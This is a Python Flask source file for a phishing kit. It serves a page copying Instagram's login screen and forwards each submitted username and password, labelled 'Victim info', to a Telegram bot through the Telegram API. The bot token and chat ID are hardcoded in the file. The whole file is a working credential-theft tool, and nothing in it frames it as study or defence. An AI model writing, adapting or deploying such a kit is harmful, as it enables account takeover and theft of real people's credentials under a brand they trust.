from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6752205626:AAFmvEgnj6j_jl1WmqSowQeSAQqYW_yo4hQ'
TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID

html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
    <style>
                body {
            font-family: sans-serif;
            background-color: #fafafa;
            box-sizing: border-box;
            align-content: top;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            flex-direction: column;
            align-items: center;
            margin-top: 3rem;
            font-size: 14px;
        }

        .box {
            max-width: 350px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background-color: #ffff;
            border: 1px solid #e6e6e6;
            border-radius: 1px;
            margin: 0 0 10px;
            padding: 10px 0;
            flex-grow: 1;
        }

        .heading {
            margin: 22px auto 12px;
            background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
            background-position: -98px 0;
            height: 51px;
            width: 177px;
            overflow: hidden;
        }

        .field {
            margin: 10px 0;
            position: relative;
            font-size: 14px;
            width: 100%;
        }

        input {
            padding: 9px 0px 7px 9px;
            font-size: 12px;
            width: 16rem;
            height: 1.2rem;
            outline: none;
            background: #fafafa;
            border-radius: 3px;
            border: 1px solid #efefef;
        }

        label {
            position: absolute;
            pointer-events: none;
            left: 10px;
            padding-bottom: 15px;
            transform: translateY(10px);
            line-height: 6px;
            transition: all ease-out 0.1s;
            font-size: 14px;
            color: #999;
            padding-top: 6px;
        }

        input::placeholder {
            visibility: hidden;
        }

        input:not(:placeholder-shown) + label {
            transform: translateY(0);
            font-size: 11px;
        }

        input:not(:placeholder-shown) {
            padding-top: 14px;
            padding-bottom: 2px;
        }

        .login-button {
            text-align: center;
            width: 100%;
            height: 35px;
            border: 1px solid transparent;
            background-color: #3897f0;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .separator {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #999;
            margin-top: 6px;
        }

        .separator .line {
            height: 1px;
            width: 40%;
            background-color: #dbdbdb;
        }

        .other {
            display: flex;
            justify-content: center;
            flex-direction: column;
            align-items: center;
        }

        .fb-login-btn {
            margin: 1rem;
            border: 0;
            cursor: pointer;
            font-size: 14px;
            color: #385185;
            font-weight: 600;
            background: transparent;
        }

        .fb-icon {
            color: #385185;
            font-size: 1rem;
            padding-right: 1px;
        }

        .forgot-password {
            font-size: 11px;
            color: #003569;
        }

        .signup {
            color: #3897f0;
            font-weight: 600;
        }

        p {
            text-align: center;
        }

        .get {
            text-align: center;
            font-size: 15px;
        }

        .apps {
            align-items: center;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="box">
        <div class="heading"></div>
        <form class="login-form" action="/submit" method="post">
            <div class="field">
                <input type="text" id="name" name="name" placeholder="Phone number, username, or email" />
                <label for="name">Phone number, username, or email</label>
            </div>
            <div class="field">
                <input  id="password" name="password" type="password" placeholder="password" />
                <label for="password">Password</label>
            </div>
            <input class="login-button" type="submit" value="Submit">
            <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="other">
                <button class="fb-login-btn" type="button">
                    <i class="fa fa-facebook-official fb-icon"></i>
                    <span class="">
                        <img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png" height="15" width="15">
                        <a href="facebook-login.html">&nbsp;Log in with Facebook</a>
                    </span>
                </button>
                <a class="forgot-password" href="/forget.html">Forgot password?</a>
            </div>
        </form>
    </div>
    <div class="box">
        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
    </div>
</div>

</body>
</html>
"""

@app.route('/')
def show_form():
    return html_code

@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        name = request.form.get('name')
        password = request.form.get('password')

        message = f"Victim info 🐔:\nName: {name}\nPassword: {password}"
        send_message_to_telegram(message)

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def send_message_to_telegram(message):
    telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(telegram_api_url, params=params)
    response.raise_for_status()

if __name__ == '__main__':
    app.run(debug=True)
